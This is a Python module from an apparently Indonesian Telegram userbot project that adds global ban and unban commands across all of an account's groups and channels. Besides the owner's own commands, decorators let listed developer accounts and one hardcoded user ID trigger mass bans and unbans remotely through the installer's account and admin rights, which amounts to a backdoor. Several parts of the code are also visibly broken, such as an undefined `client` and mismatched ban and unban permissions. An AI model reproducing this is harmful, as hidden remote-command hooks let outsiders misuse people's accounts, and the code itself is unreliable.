# by:koala @mixiologist
# Lord Userbot

from telethon.events import ChatAction

from userbot import DEVS, bot
from userbot.events import register
from userbot.utils import get_user_from_event, ayiin_cmd

# Ported For Lord-Userbot by liualvinas/Alvin


@bot.on(ChatAction)
async def handler(tele):
    if not tele.user_joined and not tele.user_added:
        return
    try:
        from userbot.modules.sql_helper.gmute_sql import is_gmuted

        guser = await tele.get_user()
        gmuted = is_gmuted(guser.id)
    except BaseException:
        return
    if gmuted:
        for i in gmuted:
            if i.sender == str(guser.id):
                chat = await tele.get_chat()
                admin = chat.admin_rights
                creator = chat.creator
                if admin or creator:
                    try:
                        await client.edit_permissions(
                            tele.chat_id, guser.id, view_messages=False
                        )
                        await tele.reply(
                            f"**𝙂𝘽𝙖𝙣𝙣𝙚𝙙 𝙎𝙥𝙤𝙩𝙚𝙙** \n"
                            f"**𝙁𝙞𝙧𝙨𝙩 𝙉𝙖𝙢𝙚 :** [{guser.id}](tg://user?id={guser.id})\n"
                            f"**𝘼𝙘𝙩𝙞𝙤𝙣 :** `𝘽𝙖𝙣𝙣𝙚𝙙`"
                        )
                    except BaseException:
                        return


@bot.on(ayiin_cmd(outgoing=True, pattern=r"gban(?: |$)(.*)"))
@register(incoming=True, from_users=DEVS, pattern=r"^\$cgban(?: |$)(.*)")
async def gben(userbot):
    dc = userbot
    sender = await dc.get_sender()
    me = await dc.client.get_me()
    if sender.id != me.id:
        dark = await dc.reply("`𝙂𝙪𝙖 𝙋𝙧𝙤𝙨𝙚𝙨 𝙂𝙗𝙖𝙣𝙣𝙞𝙣𝙜 𝙎𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙏𝙤𝙙...`")
    else:
        dark = await dc.edit("`𝙈𝙚𝙢𝙥𝙧𝙤𝙨𝙚𝙨 𝙂𝙡𝙤𝙗𝙖𝙡 𝘽𝙖𝙣𝙣𝙚𝙙 𝙏𝙞𝙩𝙞𝙨𝙖𝙣 𝘿𝙖𝙟𝙟𝙖𝙡..`")
    me = await userbot.client.get_me()
    await dark.edit("`⚜️ 𝙂𝙡𝙤𝙗𝙖𝙡 𝘽𝙖𝙣𝙣𝙚𝙙 𝘼𝙠𝙖𝙣 𝘼𝙠𝙩𝙞𝙛 𝙏𝙤𝙙..`")
    my_mention = "[{}](tg://user?id={})".format(me.first_name, me.id)
    await userbot.get_chat()
    a = b = 0
    if userbot.is_private:
        user = userbot.chat
        reason = userbot.pattern_match.group(1)
    try:
        user, reason = await get_user_from_event(userbot)
    except BaseException:
        pass
    try:
        if not reason:
            reason = "Private"
    except BaseException:
        return await dark.edit("**𝘼𝙣𝙟𝙞𝙣𝙜 𝙂𝙖𝙜𝙖𝙡 𝙂𝙡𝙤𝙗𝙖𝙡 𝘽𝙖𝙣𝙣𝙚𝙙 :(**")
    if user:
        if user.id in DEVS:
            return await dark.edit("**𝙂𝙖𝙜𝙖𝙡 𝙂𝙡𝙤𝙗𝙖𝙡 𝘽𝙖𝙣𝙣𝙚𝙙 𝙏𝙤𝙙, 𝙆𝙖𝙧𝙣𝙖 𝘿𝙞𝙖 𝘼𝙙𝙖𝙡𝙖𝙝 𝘽𝙤𝙨𝙨 𝙂𝙪𝙖 🤪**")
        try:
            from userbot.modules.sql_helper.gmute_sql import gmute
        except BaseException:
            pass
        testuserbot = [
            d.entity.id
            for d in await userbot.client.get_dialogs()
            if (d.is_group or d.is_channel)
        ]
        for i in testuserbot:
            try:
                await userbot.client.edit_permissions(i, user, view_messages=False)
                a += 1
                await dark.edit(
                    r"\\**#𝙂𝘽𝙖𝙣𝙣𝙚𝙙_𝙐𝙨𝙚𝙧**//"
                    f"\n\n**𝙁𝙞𝙧𝙨𝙩 𝙉𝙖𝙢𝙚:** [{user.first_name}](tg://user?id={user.id})\n"
                    f"**𝙐𝙨𝙚𝙧 𝙄𝘿:** `{user.id}`\n"
                    f"**𝘼𝙘𝙩𝙞𝙤𝙣:** `𝙂𝙡𝙤𝙗𝙖𝙡 𝘽𝙖𝙣𝙣𝙚𝙙`"
                )
            except BaseException:
                b += 1
    else:
        await dark.edit("**𝘽𝙖𝙡𝙖𝙨 𝙆𝙚 𝙋𝙚𝙨𝙖𝙣 𝙋𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙣𝙮𝙖 𝙂𝙤𝙗𝙡𝙤𝙠**")
    try:
        if gmute(user.id) is False:
            return await dark.edit(
                "**#𝘼𝙡𝙧𝙚𝙖𝙙𝙮_𝙂𝘽𝙖𝙣𝙣𝙚𝙙**\n\n𝙐𝙨𝙚𝙧 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩𝙨 𝙄𝙣 𝙈𝙮 𝙂𝙗𝙖𝙣 𝙇𝙞𝙨𝙩.**"
            )

    except BaseException:
        pass
    return await dark.edit(
        r"\\**#𝙂𝘽𝙖𝙣𝙣𝙚𝙙_𝙐𝙨𝙚𝙧**//"
        f"\n\n**𝙁𝙞𝙧𝙨𝙩 𝙉𝙖𝙢𝙚:** [{user.first_name}](tg://user?id={user.id})\n"
        f"**𝙐𝙨𝙚𝙧 𝙄𝘿:** `{user.id}`\n"
        f"**𝘼𝙘𝙩𝙞𝙤𝙣:** `𝙂𝙡𝙤𝙗𝙖𝙡 𝘽𝙖𝙣𝙣𝙚𝙙 𝘽𝙮:{me.first_name}`"
    )


@bot.on(ayiin_cmd(outgoing=True, pattern=r"ungban(?: |$)(.*)"))
@register(incoming=True, from_users=1700405732, pattern=r"^\$cungban(?: |$)(.*)")
async def gunben(userbot):
    dc = userbot
    sender = await dc.get_sender()
    me = await dc.client.get_me()
    if sender.id != me.id:
        dark = await dc.reply("`𝙐𝙣𝙂𝙗𝙖𝙣𝙣𝙞𝙣𝙜...`")
    else:
        dark = await dc.edit("`𝙐𝙣𝙂𝙗𝙖𝙣𝙣𝙞𝙣𝙜....`")
    me = await userbot.client.get_me()
    await dark.edit("`𝙈𝙚𝙢𝙗𝙖𝙩𝙖𝙡𝙠𝙖𝙣 𝙋𝙚𝙧𝙞𝙣𝙩𝙖𝙝 𝙂𝙡𝙤𝙗𝙖𝙡 𝘽𝙖𝙣𝙣𝙚𝙙`")
    my_mention = "[{}](tg://user?id={})".format(me.first_name, me.id)
    await userbot.get_chat()
    a = b = 0
    if userbot.is_private:
        user = userbot.chat
        reason = userbot.pattern_match.group(1)
    try:
        user, reason = await get_user_from_event(userbot)
    except BaseException:
        pass
    try:
        if not reason:
            reason = "Private"
    except BaseException:
        return await dark.edit("**𝙂𝙖𝙜𝙖𝙡 𝙐𝙣𝙂𝙗𝙖𝙣𝙣𝙚𝙙 :(**")
    if user:
        if user.id in DEVS:
            return await dark.edit(
                "**𝘼𝙮𝙞𝙞𝙣 𝙏𝙞𝙙𝙖𝙠 𝘽𝙞𝙨𝙖 𝙏𝙚𝙧𝙠𝙚𝙣𝙖 𝙋𝙚𝙧𝙞𝙣𝙩𝙖𝙝 𝙄𝙣𝙞, 𝙆𝙖𝙧𝙚𝙣𝙖 𝘿𝙞𝙖 𝙋𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙖𝙮𝙖**"
            )
        try:
            from userbot.modules.sql_helper.gmute_sql import ungmute
        except BaseException:
            pass
        testuserbot = [
            d.entity.id
            for d in await userbot.client.get_dialogs()
            if (d.is_group or d.is_channel)
        ]
        for i in testuserbot:
            try:
                await userbot.client.edit_permissions(i, user, send_messages=True)
                a += 1
                await dark.edit("`𝙈𝙚𝙢𝙗𝙖𝙩𝙖𝙡𝙠𝙖𝙣 𝙂𝙡𝙤𝙗𝙖𝙡 𝘽𝙖𝙣𝙣𝙚𝙙...`")
            except BaseException:
                b += 1
    else:
        await dark.edit("`𝘽𝙖𝙡𝙖𝙨 𝙆𝙚 𝙋𝙚𝙨𝙖𝙣 𝙋𝙚𝙣𝙜𝙜𝙪𝙣𝙖𝙣𝙮𝙖 𝙂𝙤𝙗𝙡𝙤𝙠`")
    try:
        if ungmute(user.id) is False:
            return await dark.edit("**𝙀𝙧𝙧𝙤𝙧! 𝙋𝙚𝙣𝙜𝙜𝙪𝙣𝙖 𝙎𝙚𝙙𝙖𝙣𝙜 𝙏𝙞𝙙𝙖𝙠 𝘿𝙞 𝙂𝙡𝙤𝙗𝙖𝙡 𝘽𝙖𝙣𝙣𝙚𝙙.**")
    except BaseException:
        pass
    return await dark.edit(
        r"\\**#𝙐𝙣𝙂𝙗𝙖𝙣𝙣𝙚𝙙_𝙐𝙨𝙚𝙧**//"
        f"\n\n**𝙁𝙞𝙧𝙨𝙩 𝙉𝙖𝙢𝙚:** [{user.first_name}](tg://user?id={user.id})\n"
        f"**𝙐𝙨𝙚𝙧 𝙄𝘿:** `{user.id}`\n"
        f"**𝘼𝙘𝙩𝙞𝙤𝙣:** `𝙐𝙣𝙂𝙗𝙖𝙣𝙣𝙚𝙙 𝘽𝙮 {me.first_name}`"
    )
